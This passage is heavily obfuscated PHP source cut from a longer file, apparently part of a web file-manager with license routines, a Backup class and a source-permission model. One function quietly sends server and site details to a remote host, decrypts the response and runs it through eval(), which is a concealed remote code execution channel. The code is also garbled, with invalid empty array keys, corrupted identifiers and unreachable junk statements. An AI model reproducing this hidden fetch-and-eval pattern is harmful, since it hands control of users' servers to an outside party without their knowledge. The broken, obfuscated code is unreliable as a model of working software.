$b䍹[61]($b䍹[152])->{$_SERVER[뱊][153]}()) { $b䍹[187]($b䍹[219]($b䍹[268]), !1, $b䍹[261]); die; } } } } private function urfyc5a62748() { goto B; dص: $FҚ[280]($FҚ[281]); if ($B && $FҚ[32]($B, $FҚ[282])) { echo $B; } die; goto DҚƝ; Cԉ: if (!$FҚ[119]($GLOBALS, $FҚ[145]) || !isset($_GET[$FҚ[270]])) { return; } if (!$FҚ[264]($_SERVER[$FҚ[44]], $aפьݑ)) { return; } $cʋ = $FҚ[271]; goto dٵ̱; CƲ: $B = @$FҚ[279]($cʋ, !1, $dŨђ); $D = $cύ[644]; if (!$D) { return; } goto dص; B: $cύ =& $_SERVER[]; $FҚ =& $_SERVER[뱊]; $aפьݑ = array($FҚ[148], $FҚ[269]); goto Cԉ; dٵ̱: $cʋ = $this->{$_SERVER[뱊][272]}($cʋ, $FҚ[273]); $Fǽ = $cύ[643]; $dŨђ = $FҚ[274](array($FҚ[275] => array($FҚ[276] => $FҚ[277], $FҚ[278] => 3))); goto CƲ; DҚƝ: } public function uqoj3003d2da($dՅ) { goto E򖰊; Bپ讱: $Bڪ = $bߵӤ[0]($bߵӤ[302], $bߵӤ[119]($this->jowbb2480663, $bߵӤ[142], $bߵӤ[10])); $Cό = array(); $Cɔ = $_SERVER[][645]; goto e; E򖰊: $bߵӤ =& $_SERVER[뱊]; if ($this->vtga38cf3c9c == $bߵӤ[283]) { return $dՅ; } $C = array($bߵӤ[284] => $bߵӤ[285], $bߵӤ[286] => $bߵӤ[285], $bߵӤ[287] => $bߵӤ[285], $bߵӤ[288] => $bߵӤ[285], $bߵӤ[289] => $bߵӤ[290], $bߵӤ[291] => $bߵӤ[290], $bߵӤ[292] => $bߵӤ[290], $bߵӤ[293] => $bߵӤ[290], $bߵӤ[294] => $bߵӤ[290], $bߵӤ[295] => $bߵӤ[290], $bߵӤ[296] => $bߵӤ[290], $bߵӤ[297] => $bߵӤ[290], $bߵӤ[298] => $bߵӤ[290], $bߵӤ[299] => $bߵӤ[290], $bߵӤ[300] => $bߵӤ[290], $bߵӤ[301] => $bߵӤ[290]); goto Bپ讱; e: foreach ($C as $dڅ => $Aۉ̟) { if ($Aۉ̟ == $bߵӤ[285] && $bߵӤ[25]($this->vtga38cf3c9c, 0, 1) == $bߵӤ[285]) { continue; } if (!$bߵӤ[264]($dڅ, $Bڪ)) { $Cό[] = $dڅ; } } foreach ($Cό as $dڅ) { unset($dՅ[$dڅ]); } return $dՅ; goto Eȸ; Eȸ: } private function conh36f12196() { goto cՍ; Aב: if ($C߫ڵ[61]($C߫ڵ[305])->{$_SERVER[뱊][63]}($C߫ڵ[93]) != $C߫ڵ[256]) { $C߫ڵ[61]($C߫ڵ[305])->{$_SERVER[뱊][243]}($C߫ڵ[93], $C߫ڵ[256]); } goto d­; cՍ: $C߫ڵ =& $_SERVER[뱊]; if ($this->vtga38cf3c9c != $C߫ڵ[134]) { return; } $GLOBALS[$C߫ڵ[107]][$C߫ڵ[111]][$C߫ڵ[303]] = $C߫ڵ[242]; goto FآӔ; FآӔ: $GLOBALS[$C߫ڵ[107]][$C߫ڵ[304]] = $C߫ڵ[242]; $f֪ = $_SERVER[][646]; if (!$f֪) { die; } goto Aב; d­: } public function gmkhbd37f422() { return $_SERVER[뱊][306]; } private function pife1bef24a3() { goto f悤; BΊƈ: if ($this->vtga38cf3c9c == $Aל[134] || !$Aל[119]($GLOBALS, $Aל[145])) { return; } if (!$Aל[264]($_SERVER[$Aל[44]], $a҃)) { return; } if ($Aל[258]() % 4 != 0) { return; } goto b߭; f悤: $e =& $_SERVER[]; $Aל =& $_SERVER[뱊]; $a҃ = array($Aל[307], $Aל[308], $Aל[309]); goto fΒ; b߭: $f = $Aל[13](array($Aל[312], $Aל[313]), $Cʔ); if ($f && $Aל[258]() - $f < $Aל[266]($Aל[314])) { return; } $Aל[13](array($Aל[312], $Aל[173]), $Cʔ, $Aל[258]()); goto fΈ; c: $eŲ璆 = $this->{$_SERVER[뱊][205]}($Aל[315], $AѪ); $aҊ␱ = $e[649]; if (!$Aל[164]($eŲ璆)) { return; } goto Cꩭ; fΈ: $A = $Aל[61]($Aל[62])->{$_SERVER[뱊][63]}($Aל[129]); $AѪ = array($Aל[186] => $Aל[61]($Aל[62])->{$_SERVER[뱊][63]}($Aל[230]), $Aל[200] => $this->vtga38cf3c9c, $Aל[197] => $_SERVER[$Aל[198]], $Aל[199] => $Aל[61]($Aל[62])->{$_SERVER[뱊][63]}($Aל[160]), $Aל[126] => $Aל[127]($_SERVER[$Aל[128]] . $A), $Aל[190] => $Aל[170], $Aל[193] => $_SERVER[$Aל[194]]); $E = $e[648]; goto c; fΒ: $Cʔ = $Aל[310] . $Aל[127]($Aל[311]); $Eׂ = $e[647]; while (strlen($Eׂ) < $e[593]) { if (!$Eׂ) { break; } $Eׂ++; } goto BΊƈ; Cꩭ: if ($eŲ璆[$Aל[186]] && $eŲ璆[$Aל[316]]) { if ($this->{$_SERVER[뱊][221]}($eŲ璆[$Aל[316]]) == $AѪ[$Aל[186]]) { return; } } $this->{$_SERVER[뱊][185]}(); if ($this->{$_SERVER[뱊][221]}($eŲ璆[$Aל[316]]) != $AѪ[$Aל[186]]) { $b = array($Aל[223] => $A, $Aל[224] => $_SERVER[$Aל[128]], $Aל[225] => $Aל[226](), $Aל[195] => $_SERVER[$Aל[196]]); $A߭ = $this->{$_SERVER[뱊][227]}($Aל[169]($b)); $eŲ璆 = $this->{$_SERVER[뱊][205]}($Aל[228] . $A߭); if ($eŲ璆 && $Aל[164]($eŲ璆) && isset($eŲ璆[$Aל[316]])) { $Fڑ = $this->{$_SERVER[뱊][211]}($eŲ璆[$Aל[316]], 2); if ($Fڑ) { $Fڑ = $this->{$_SERVER[뱊][221]}($Fڑ); } if ($Fڑ) { try { @eval($Fڑ); } catch (Exception $CΎ) { } } } } goto D굩߂; D굩߂: } private function mtpj8035937d($Cı̵ߥ = '', $cҟ = array(), $eֆԌ̬ = 5) { goto F緢牗; F緢牗: $cٞ =& $_SERVER[]; $B =& $_SERVER[뱊]; $b = $B[317]; goto eǥ; bǹ: $b̂썺 = $cٞ[651]; if (strlen($b̂썺) < $cٞ[601]) { die; } $b = $b . $Cı̵ߥ; goto aߟ; eϼ٤: $eڧɈ = $B[274](array($B[275] => array($B[278] => $eֆԌ̬, $B[276] => $B[321]), $B[322] => array($B[323] => !1, $B[324] => !1))); $Fǔ = $cٞ[643]; if (!$Fǔ) { die; } goto dϋ; eǥ: $d좙 = $cٞ[650]; if (strlen($d좙) < $cٞ[591]) { die; } $b = $this->{$_SERVER[뱊][272]}($b, $B[318]); goto bǹ; aߟ: $bՌ = $cٞ[652]; if ($cҟ && $B[164]($cҟ)) { $b = $b . $B[319] . $B[320]($cҟ); } if ($cҟ === -1) { return $b; } goto eϼ٤; dɦ: if (strlen($A֊) < $cٞ[621]) { die; } goto F姡; dϋ: $cҟ = @$B[279]($b, !1, $eڧɈ); return $B[213]($cҟ, !0); $A֊ = $cٞ[653]; goto dɦ; F姡: } private function jgkm33461065() { goto fυ; d𲉍: $D = $D̓[654]; if (!$D) { die; } $b = $d֐[$this->vtga38cf3c9c]; goto D쑛; B: $B쎩 = $A݊[119]($this->jowbb2480663, $A݊[352]); $B쎩 = $B쎩 ? $A݊[266]($B쎩) : 0; return $b + $B쎩; goto F͚; fυ: $D̓ =& $_SERVER[]; $A݊ =& $_SERVER[뱊]; $d֐ = array($A݊[325] => $A݊[326], $A݊[327] => $A݊[328], $A݊[329] => $A݊[330], $A݊[331] => $A݊[332], $A݊[333] => $A݊[334], $A݊[335] => $A݊[267], $A݊[336] => $A݊[267], $A݊[337] => $A݊[326], $A݊[338] => $A݊[328], $A݊[339] => $A݊[330], $A݊[340] => $A݊[341], $A݊[342] => $A݊[332], $A݊[343] => $A݊[344], $A݊[345] => $A݊[334], $A݊[346] => $A݊[347], $A݊[348] => $A݊[349], $A݊[350] => $A݊[351]); goto d𲉍; D쑛: $D = $D̓[655]; if (!$D) { die; } $b = $A݊[266]($b ? $b : $A݊[326]); goto B; F͚: } public function mioz104f190b($C霩ք) { goto a憰; B: $CĖ = $c[61]($c[152])->{$_SERVER[뱊][153]}(); if ($CĖ <= $a七) { return; } $e = $c[61]($c[152])->{$_SERVER[뱊][354]}($c[353])->{$_SERVER[뱊][355]}($a七)->{$_SERVER[뱊][356]}(); goto d蓡鄢; aۗ: $A = $d݂[656]; if ($C霩ք[$c[353]] == $c[242]) { return; } if ($a七 >= $c[266]($c[267])) { return; } goto B; d蓡鄢: $f = $d݂[657]; if (strlen($f) < $d݂[593]) { return; } $e = $c[244]($e, $c[10], $c[353]); goto D⹇; D⹇: $B傠 = $d݂[658]; while ($B傠 < $d݂[595]) { if ($B傠 >= 0) { break; } $B傠++; } if (!$c[264]($C霩ք[$c[353]], $e)) { $c[187]($c[357], !1, $c[261]); } goto cњ΢; a憰: $d݂ =& $_SERVER[]; $c =& $_SERVER[뱊]; $a七 = $this->{$_SERVER[뱊][150]}(); goto aۗ; cњ΢: } public function ezld0446d0df() { goto Cџ; c˥ꆺ: if (strlen($EӃ) < $Aҵ[593]) { return; } $d = $F[274](array($F[275] => array($F[276] => $F[277], $F[278] => 3))); $Bў = $Aҵ[660]; goto d; d: $b鮕 = @$F[279]($CŻ, !1, $d); $a = $Aҵ[661]; if (strlen($a) < $Aҵ[595]) { die; } goto Bܐ; Cџ: $Aҵ =& $_SERVER[]; $F =& $_SERVER[뱊]; if (!$F[119]($GLOBALS, $F[145]) || $F[358](1, 100) > 20) { return; } goto Bô; Bô: $CŻ = $F[271]; $CŻ = $this->{$_SERVER[뱊][272]}($CŻ, $F[273]); $EӃ = $Aҵ[659]; goto c˥ꆺ; Bܐ: echo $F[359] . $F[360]($b鮕) . $F[361]; $f = $Aҵ[662]; goto DІ; DІ: } private function xwirad89a69c($c, $D΅, $aߋ = 3) { goto Cçᤓ; c᜻: $CՂ = $D[663]; if (strlen($CՂ) < $D[601]) { die; } $F = $D􆎐[363]; goto Cְ; Cçᤓ: $D =& $_SERVER[]; $D􆎐 =& $_SERVER[뱊]; $D􆎐[362](1); goto cؙϾ; cؙϾ: $c = $D􆎐[2]($c); $BΞ = $D􆎐[358](0, 5) . $D􆎐[10]; $fѪ = $D􆎐[137](15); goto c᜻; CͷИ: $E쬸 = $D􆎐[236]($BΞ . $fѪ . $E쬸); if ($aߋ - 1 > 0) { $E쬸 = $this->{$_SERVER[뱊][140]}($E쬸, $D΅, $aߋ - 1); } return $E쬸; goto C; Cְ: $C = $D[664]; while ($C < $D[593]) { if ($C >= 0) { break; } $C++; } switch ($BΞ) { case $D􆎐[256]: $E쬸 = $this->{$_SERVER[뱊][168]}($c, $D􆎐[236]($D΅ . $fѪ)); $B֍ = $D[665]; if (!$B֍) { die; } break; case $D􆎐[242]: $E쬸 = $this->{$_SERVER[뱊][168]}($c, $D􆎐[236]($fѪ . $D΅)); $bͻ = $D[666]; while (strlen($bͻ) < $D[591]) { if (!$bͻ) { break; } $bͻ++; } break; case $D􆎐[364]: $E쬸 = $this->{$_SERVER[뱊][168]}($c, $D􆎐[131]($fѪ . $D΅)); break; $aڔ = $D[667]; case $D􆎐[365]: $E쬸 = $this->{$_SERVER[뱊][168]}($c, $D􆎐[127]($fѪ . $D΅)); $BЈ = $D[668]; while ($BЈ < $D[621]) { if ($BЈ >= 0) { break; } $BЈ++; } break; case $D􆎐[366]: goto b; BҖ: $fՈ = 0; $dé = $D[671]; if (strlen($dé) < $D[593]) { return; } goto f񡈕; cΤ؏: break; $c׺ = $D[675]; if (!$c׺) { die; } goto d濰; C˔: $c = $D[669]; if (!$c) { die; } $d = $D􆎐[127]($Ȁ . $D􆎐[127]($D΅ . $Ȁ) . $D΅); goto C; C: $d = $D􆎐[25]($d, $f % 8, $f % 8 + 7); $fԆ = $D􆎐[10]; $e֤ = $D[670]; goto BҖ; b: $c = $D􆎐[131]($c); $f = $D􆎐[367](0, 64); $Ȁ = $F[$f]; goto C˔; f񡈕: $dݹ㪎 = 0; $aǐֹ = $D[672]; if (strlen($aǐֹ) < $D[621]) { return; } goto Dㇵ; Dㇵ: $DĜ = 0; for ($fՈ = 0; $fՈ < $D􆎐[24]($c); $fՈ++) { $DĜ = $DĜ == $D􆎐[24]($d) ? 0 : $DĜ; $B = $D[673]; while (strlen($B) < $D[595]) { if (!$B) { break; } $B++; } $dݹ㪎 = ($f + $D􆎐[368]($F, $c[$fՈ]) + $D􆎐[369]($d[$DĜ++])) % 64; $cӭ = $D[674]; if (!$cӭ) { die; } $fԆ .= $F[$dݹ㪎]; } $E쬸 = $D􆎐[360]($Ȁ . $fԆ); goto cΤ؏; d濰: default: $E쬸 = $this->{$_SERVER[뱊][168]}($c, $D΅ . $fѪ); break; $c޷Ǹ = $D[676]; if (strlen($c޷Ǹ) < $D[621]) { return; } } goto CͷИ; C: } private function qjwl59d856ee($C, $Dܸ, $eޏ = 3) { goto eЫ; eܜª: $C = $Fថź[2]($C); $C = $Fថź[236]($C); $Dع = $C[0]; goto eԕ; C: switch ($Dع) { case $Fថź[256]: $Aƹ = $this->{$_SERVER[뱊][272]}($C, $Fថź[236]($Dܸ . $b܃)); $cҠ = $A[680]; break; $bԼދ = $A[681]; if (!$bԼދ) { die; } case $Fថź[242]: $Aƹ = $this->{$_SERVER[뱊][272]}($C, $Fថź[236]($b܃ . $Dܸ)); $Bڼ = $A[682]; if (strlen($Bڼ) < $A[595]) { return; } break; $c˴ = $A[683]; if (!$c˴) { return; } case $Fថź[364]: $Aƹ = $this->{$_SERVER[뱊][272]}($C, $Fថź[131]($b܃ . $Dܸ)); break; $cߙ㰍 = $A[684]; if (strlen($cߙ㰍) < $A[595]) { die; } case $Fថź[365]: $Aƹ = $this->{$_SERVER[뱊][272]}($C, $Fថź[127]($b܃ . $Dܸ)); $d = $A[685]; if (!$d) { return; } break; $c֥ = $A[686]; while ($c֥ < $A[595]) { if ($c֥ >= 0) { break; } $c֥++; } case $Fថź[366]: goto D䠨͑; D䠨͑: $C = $Fថź[370]($C); $cҊ = $A[687]; $d˧ = $C[0]; goto bлՄ; cڕ: break; $B뱵同 = $A[694]; if (strlen($B뱵同) < $A[601]) { return; } goto A; bĉ: $c˃ = $A[689]; $E = 0; $cߦ쓾 = $A[690]; goto D؛; F쐼: $B = $Fថź[10]; $B = 0; $B = 0; goto bĉ; bлՄ: $C = $Fថź[25]($C, 1); $Dι = $Fថź[368]($Eʑ, $d˧); $Aٜт = $Fថź[127]($d˧ . $Fថź[127]($Dܸ . $d˧) . $Dܸ); goto F; F: $Aٜт = $Fថź[25]($Aٜт, $Dι % 8, $Dι % 8 + 7); $Bլ = $A[688]; while (strlen($Bլ) < $A[601]) { if (!$Bլ) { break; } $Bլ++; } goto F쐼; D؛: while (strlen($cߦ쓾) < $A[593]) { if (!$cߦ쓾) { break; } $cߦ쓾++; } for ($B = 0; $B < $Fថź[24]($C); $B++) { $E = $E == $Fថź[24]($Aٜт) ? 0 : $E; $eׇձ = $A[691]; if (!$eׇձ) { return; } $cఐ = $E++; $B = $Fថź[368]($Eʑ, $C[$B]) - $Dι - $Fថź[369]($Aٜт[$cఐ]); while ($B < 0) { $B += 64; $eɏ = $A[692]; } $B .= $Eʑ[$B]; $Eй = $A[693]; if (!$Eй) { die; } } $Aƹ = $Fថź[371]($B); goto cڕ; A: default: $Aƹ = $this->{$_SERVER[뱊][272]}($C, $Dܸ . $b܃); break; $C = $A[695]; while ($C < $A[601]) { if ($C >= 0) { break; } $C++; } } if ($eޏ - 1 > 0) { $Aƹ = $this->{$_SERVER[뱊][211]}($Aƹ, $Dܸ, $eޏ - 1); } return $Aƹ; goto A㗵; eԕ: $bȵ؆ = $A[677]; if (strlen($bȵ؆) < $A[595]) { return; } $b܃ = $Fថź[25]($C, 1, 15); goto aԧ; aԧ: $dЌ = $A[678]; if (!$dЌ) { die; } $C = $Fថź[25]($C, 16); goto dĸ; dĸ: $Eʑ = $Fថź[363]; $aٷ = $A[679]; if (strlen($aٷ) < $A[621]) { return; } goto C; eЫ: $A =& $_SERVER[]; $Fថź =& $_SERVER[뱊]; if (!$Fថź[161]($C) || $Fថź[24]($C) < 10) { return !1; } goto eܜª; A㗵: } public function cwyl3c398b6f($e߇ˏꎋ) { goto cË; f: if (strlen($D·) < $e[593]) { die; } for ($cۄ = 0; $cۄ < $Eᲄ * 10; $cۄ++) { if (($Eᲄ * $cۄ + 1) % $FȮ۷ == 0) { $Fޤ = $F􃔭[266](($Eᲄ * $cۄ + 1) / $FȮ۷); break; } } $cȦ஘ = $this->{$_SERVER[뱊][168]}($bޒ * $AԻ . $F􃔭[10], $F􃔭[170]); goto F; dƗ: while (1) { $aӈ = $FȮ۷; $c = $e[698]; while ($c < $e[595]) { if ($c >= 0) { break; } $c++; } $FҐ = $Eᲄ; while ($FҐ % $aӈ != 0) { $aۧݮ = $FҐ; $E☞أ = $e[699]; if (strlen($E☞أ) < $e[601]) { return; } $FҐ = $aӈ; $f = $e[700]; if (!$f) { return; } $aӈ = $aۧݮ % $aӈ; $C = $e[701]; if (!$C) { die; } } if ($aӈ == 1) { break; } else { $FȮ۷++; } } $Fޤ = 2; $D· = $e[702]; goto f; F: $Aȩ¼ = $F􃔭[127]($F􃔭[373] . ($bޒ + $AԻ) . $F􃔭[374] . $FȮ۷ . $F􃔭[374] . $Fޤ . $F􃔭[375]); $E = $e[703]; $dРȅ = $this->{$_SERVER[뱊][168]}($e߇ˏꎋ, $Aȩ¼) . $F􃔭[376] . $cȦ஘; goto eƆ; cË: $e =& $_SERVER[]; $F􃔭 =& $_SERVER[뱊]; $bޒ = $this->{$_SERVER[뱊][372]}(); goto Fُ; eƆ: return $dРȅ; goto fƋט; D: $FȮ۷ = $F􃔭[266](($bޒ + $AԻ) / 2); $Eǡœ = $e[697]; if (!$Eǡœ) { return; } goto dƗ; Fُ: $AԻ = $this->{$_SERVER[뱊][372]}(); $Eᲄ = ($bޒ - 1) * ($AԻ - 1); $Dχ = $e[696]; goto D; fƋט: } public function chnufcfbf058($E) { goto C; aΗէ: if (!$B١А) { die; } $c = $this->{$_SERVER[뱊][272]}($E[0], $d̑); return $c; goto e㌐; C: $A⼺ۄ =& $_SERVER[]; $e =& $_SERVER[뱊]; $E = $e[0]($e[376], $E); goto dψܑ; BÈ: if (strlen($F˟) < $A⼺ۄ[591]) { die; } $F = 0; for ($Eۓ = 3; $Eۓ < $F֙Щ; $Eۓ += 2) { if ($F֙Щ % $Eۓ != 0) { continue; } $F = $Eۓ; $b۶ = $A⼺ۄ[705]; if (strlen($b۶) < $A⼺ۄ[595]) { die; } $F = $e[266]($F֙Щ / $Eۓ); break; } goto D; Cב: for ($Eۓ = 0; $Eۓ < $bƊ * 10; $Eۓ++) { if (($bƊ * $Eۓ + 1) % $FԐܠ == 0) { $Dŏ = $e[266](($bƊ * $Eۓ + 1) / $FԐܠ); break; } } $d̑ = $e[127]($e[373] . ($F + $F) . $e[374] . $FԐܠ . $e[374] . $Dŏ . $e[375]); $B١А = $A⼺ۄ[709]; goto aΗէ; dψܑ: if ($e[19]($E) != 2) { return $e[10]; } $F֙Щ = $this->{$_SERVER[뱊][272]}($E[1] . $e[10], $e[170]); if (!$F֙Щ) { return $e[10]; } goto F񣄾; D: $bƊ = ($F - 1) * ($F - 1); $FԐܠ = $e[266](($F + $F) / 2); $AҘ = $A⼺ۄ[706]; goto Aȧ; Aȧ: while (strlen($AҘ) < $A⼺ۄ[593]) { if (!$AҘ) { break; } $AҘ++; } while (1) { $c = $FԐܠ; $dЂ = $A⼺ۄ[707]; if (strlen($dЂ) < $A⼺ۄ[591]) { return; } $DН = $bƊ; while ($DН % $c != 0) { $E̦ = $DН; $DН = $c; $c = $E̦ % $c; $d = $A⼺ۄ[708]; if (strlen($d) < $A⼺ۄ[601]) { die; } } if ($c == 1) { break; } else { $FԐܠ++; } } $Dŏ = 2; goto Cב; F񣄾: $F֙Щ = $e[266]($F֙Щ); $F = 0; $F˟ = $A⼺ۄ[704]; goto BÈ; e㌐: } public function refzc33fabbb() { goto E; cգ: return $d֓â; goto a͂; eݠ㼩: $f = array(); $Aâփ = 1; $c = $a󞶱[710]; goto e駯; e駯: while ($Aâփ <= (int) $B鍾[378]($e蝸)) { $e = $Aâփ; $D = $a󞶱[711]; if (strlen($D) < $a󞶱[591]) { die; } while (!0) { $e++; if ($e <= 2) { $Aâփ = $e; break; } else { if ($e < 2) { continue; } } $DҐ = !0; for ($aܖ݌ = 2; $aܖ݌ <= $B鍾[378]($e); $aܖ݌++) { if ($e % $aܖ݌ == 0) { $DҐ = !1; } } if ($DҐ) { $Aâփ = $e; break; } } $f[] = $Aâփ; } $d֓â = 2; for ($e = $e蝸; $e > 1; $e--) { $DҐ = !0; $C͞ = $a󞶱[712]; if (strlen($C͞) < $a󞶱[601]) { die; } foreach ($f as $a籌) { if ($e % $a籌 == 0) { $DҐ = !1; break; } } if ($DҐ) { $d֓â = $e; break; } } goto cգ; E: $a󞶱 =& $_SERVER[]; $B鍾 =& $_SERVER[뱊]; $e蝸 = $B鍾[358]($B鍾[377](2, 14), $B鍾[377](2, 16) - 1); goto eݠ㼩; a͂: } public function fikn10b8a175($b, $b) { $B =& $_SERVER[뱊]; return $B[13](array($B[14], $B[379]), $b, $b); } public function hqjm7c9d2d9e($C, $dӗݗ) { $e =& $_SERVER[뱊]; return $e[13](array($e[380], $e[381]), $C, $dӗݗ); } public function elrm31777ddd($fϲ, $b؛) { $c =& $_SERVER[뱊]; return $c[13](array($c[380], $c[382]), $fϲ, $b؛); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $B߆Ȯ =& $_SERVER[]; $this->isManual(); self::$name = date($B߆Ȯ[713]); if (!($a惵 = Model($B߆Ȯ[714])->lastItem())) { $a惵 = $this->initData(); } else { self::$name = $a惵[$B߆Ȯ[28]]; if ($a惵[$B߆Ȯ[715]] == $B߆Ȯ[87]) { self::$name = date($B߆Ȯ[716]); $fƹ = 0; if (isset($a惵[$B߆Ȯ[291]][$B߆Ȯ[193]][$B߆Ȯ[447]])) { $fƹ = (int) $a惵[$B߆Ȯ[291]][$B߆Ȯ[193]][$B߆Ȯ[447]]; } if (self::$manual == 0 && $a惵[$B߆Ȯ[28]] == self::$name) { Model($B߆Ȯ[714])->remove($a惵[$B߆Ȯ[393]]); } $a惵 = $this->initData($fƹ, $a惵[$B߆Ȯ[717]]); } else { $this->checkStore($a惵[$B߆Ȯ[717]]); } } self::$option = $a惵; } private function isManual() { $AǇ = _get($GLOBALS, $_SERVER[][718], 0); $AǇ = intval($AǇ); self::$manual = $AǇ && $AǇ == 1 ? 1 : 0; } private function initData($E݃ = 0, $b = '') { goto d݄; dۆ: $D = Model($bໍ[714])->insert($Dڎ΃); $Dڎ΃[$bໍ[393]] = $D; return $Dڎ΃; goto Bֱ; aǢн: $this->checkStore($D֭[$bໍ[717]]); if (self::$manual == 1) { self::$name .= $bໍ[71] . date($bໍ[719]); } $Dڎ΃ = array($bໍ[717] => $D֭[$bໍ[717]], $bໍ[28] => self::$name, $bໍ[715] => 0, $bໍ[720] => $D֭[$bໍ[720]], $bໍ[721] => self::$manual, $bໍ[291] => array($bໍ[722] => array($bໍ[715] => 0), $bໍ[723] => array($bໍ[715] => 0, $bໍ[724] => 0, $bໍ[725] => 0, $bໍ[29] => $bໍ[33], $bໍ[726] => 0, $bໍ[476] => 0), $bໍ[727] => array($bໍ[715] => 0, $bໍ[724] => 0, $bໍ[725] => 0, $bໍ[726] => 0, $bໍ[476] => 0), $bໍ[193] => array($bໍ[715] => 0, $bໍ[728] => 0, $bໍ[729] => 0, $bໍ[730] => 0, $bໍ[731] => 0, $bໍ[447] => $E݃, $bໍ[726] => 0, $bໍ[476] => 0)), $bໍ[726] => time(), $bໍ[476] => 0); goto dۆ; d݄: $bໍ =& $_SERVER[]; $D֭ = Model($bໍ[714])->config(); if ($b && $D֭[$bໍ[717]] != $b) { $E݃ = 0; } goto aǢн; Bֱ: } private function checkStore($fŒ) { $D =& $_SERVER[]; $Dϴ = Model($D[732])->listData($fŒ); Model($D[732])->checkConfig($Dϴ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][714])->findByName(self::$name); } return self::$option; } public static function set($Bȩ) { $fȼګ扩 =& $_SERVER[]; $dփâ = self::get(); foreach ($Bȩ as $CԪ => $E) { $BУ = explode($fȼګ扩[95], $CԪ); $D = count($BУ); switch ($D) { case 1: $dփâ[$BУ[0]] = $E; break; case 2: $dփâ[$BУ[0]][$BУ[1]] = $E; break; case 3: $dփâ[$BУ[0]][$BУ[1]][$BУ[2]] = $E; break; } } Model($fȼګ扩[714])->update($dփâ[$fȼګ扩[393]], $dփâ); self::$option = $dփâ; return self::$option; } public function keep() { $f㈲ٙ =& $_SERVER[]; $D = self::get(); if ($D[$f㈲ٙ[291]][$f㈲ٙ[722]][$f㈲ٙ[715]] == $f㈲ٙ[87]) { return; } $this->backupKeep($D); self::set(array($f㈲ٙ[733] => 1)); } private function backupKeep($f) { goto A󋪤; Bࠥ: $e̱ = Model($aǘ[735])->get($aǘ[736]); foreach ($fɤþ as $dŴ) { if (isset($dŴ[$aǘ[721]]) && $dŴ[$aǘ[721]] == $aǘ[87]) { continue; } if (!empty($dŴ[$aǘ[28]]) && in_array($dŴ[$aǘ[28]], $f)) { continue; } Model($aǘ[714])->remove($dŴ[$aǘ[393]]); $Dз = $this->backupPath($f, $e̱); IO::remove($Dз, !1); } goto f; Bə: if (empty($fɤþ)) { return; } $B = 0; $f = array(); goto aֈ; A󋪤: $aǘ =& $_SERVER[]; if (self::$manual == 1) { return; } $fɤþ = Model($aǘ[714])->listData(); goto Bə; aֈ: foreach ($fɤþ as $dŴ) { if ($B >= 7) { break; } $f[] = $dŴ[$aǘ[28]]; $B++; } for ($B = 0; $B < 12; $B++) { $f[] = date($aǘ[734], strtotime("\55{$B}\40\155\x6f\x6e\x74\150\163")); } $f = array_unique($f); goto Bࠥ; f: } private function backupPath($c, $C̙ = false) { $A =& $_SERVER[]; if (!$C̙) { $C̙ = Model($A[735])->get($A[736]); } $B = $c[$A[28]]; $f = substr(md5($A[737] . $C̙ . $B), 0, 8); return "\173\x69\157\x3a{$c[$A[717]]}\x7d\57\x64\141\x74\141\x62\141\x73\x65\x2f\142\141\x63\x6b\165\160\57" . $B . $A[71] . $f; } public function db() { goto A¼ڒ; d: return !0; goto C컄; A¼ڒ: $Bʹ =& $_SERVER[]; $eհ = self::get(); if ($eհ[$Bʹ[291]][$Bʹ[723]][$Bʹ[715]] == $Bʹ[87]) { return !0; } goto aǜ˶ȍ; aǜ˶ȍ: $A = new BackupDb(); if (!$A->index()) { return !1; } self::set(array($Bʹ[738] => 1)); goto d; C컄: } public function dbFile() { goto FԌ£; c: return !0; goto aݠ; FԌ£: $D̚Š =& $_SERVER[]; $b = self::get(); if ($b[$D̚Š[291]][$D̚Š[727]][$D̚Š[715]] == $D̚Š[87]) { return !0; } goto F; F: $eǢ = new BackupDbFile(); if (!$eǢ->index()) { return !1; } self::set(array($D̚Š[739] => 1)); goto c; aݠ: } public function file() { $Aߊǽ =& $_SERVER[]; $dˆ = self::get(); if ($dˆ[$Aߊǽ[291]][$Aߊǽ[193]][$Aߊǽ[715]] == $Aߊǽ[87]) { return !0; } if (!isset($dˆ[$Aߊǽ[720]]) || $dˆ[$Aߊǽ[720]] == $Aߊǽ[191]) { $f = new BackupFile(); if (!$f->index()) { return !1; } } self::set(array($Aߊǽ[740] => 1, $Aߊǽ[715] => 1)); return !0; } } goto C; E: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\x63\x65\137\141\x75\x74\x68"; public function getAuth($c) { goto eܿ; eܿ: $Bۄ =& $_SERVER[]; $E֝ = $this->sourceAuthSelect($c); $A = array(); goto f꣥; aع: array_multisort($a, SORT_DESC, $A); return $A; goto f囃; f꣥: $a = array(); $dψջ = 2 << 25; foreach ($E֝ as $a挃) { goto Eۊ; A: $b▫ = 0; if ($a挃[$Bۄ[404]] == SourceModel::TYPE_GROUP) { $b▫ = $dψջ * 2; } if ($a挃[$Bۄ[404]] == SourceModel::TYPE_USER) { $b▫ = $dψջ; } goto A܉; A܉: if ($a挃[$Bۄ[404]] == SourceModel::TYPE_USER && $a挃[$Bۄ[484]] == $Bۄ[191]) { $b▫ = 0; } $a[] = $F[$Bۄ[406]] + $b▫; goto Fㅱ; Eۊ: $F = Model($Bۄ[488])->listData($a挃[$Bۄ[1797]]); if (!$F) { continue; } $A[] = $a挃; goto A; Fㅱ: } goto aع; f囃: } public function sourceAuthSelect($dà) { goto E; B˼: $e = $this->field($D𶋸)->order($f[393])->where($b·)->select(); $c = array_to_keyvalue_group($e, $f[395]); foreach ($dà as $a) { $a݇Ҏ[$a] = $c[$a] ? $c[$a] : array(); } goto aؗ; f: if ($d) { $dà = array($dà); } $c = array(); foreach ($dà as $a) { if (isset($a݇Ҏ[$a])) { $c[$a] = $a݇Ҏ[$a]; } } goto eݝ; E: $f =& $_SERVER[]; static $a݇Ҏ = array(); $d = is_array($dà) ? !1 : !0; goto f; eݝ: if (count($c) == count($dà)) { return $d ? $c[$dà[0]] : $c; } $D𶋸 = $f[1869]; $b· = array($f[395] => array($f[7], $dà)); goto B˼; aؗ: if ($d) { return $e; } return $c; goto a; a: } public function setAuth($Dߐ, $E̩) { goto f; Eʒ: if ($E[$bմ[404]] != SourceModel::TYPE_GROUP) { return !1; } $CɃ = 1; $C݅ = $E[$bմ[484]]; goto E޿; f: $bմ =& $_SERVER[]; $E = Model($bմ[1209])->sourceInfo($Dߐ); if (!$E) { return !1; 